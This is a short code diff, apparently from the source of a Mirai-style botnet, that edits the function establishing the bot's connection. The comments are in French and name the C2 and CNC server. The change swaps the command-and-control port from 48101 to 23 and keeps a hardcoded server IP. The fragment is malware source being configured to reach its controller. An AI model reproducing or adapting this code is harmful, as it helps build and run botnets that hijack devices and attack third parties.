@@ -403,7 +403,7 @@ static void establish_connection(void)
 
      srv_addr.sin_family = AF_INET;
      srv_addr.sin_addr.s_addr = inet_addr("192.168.1.56");  // IP du CNC
-     srv_addr.sin_port = htons(48101);                      // Port du bot C2
+     srv_addr.sin_port = htons(23);                      // Port du bot C2
 
     pending_connection = TRUE;
     connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
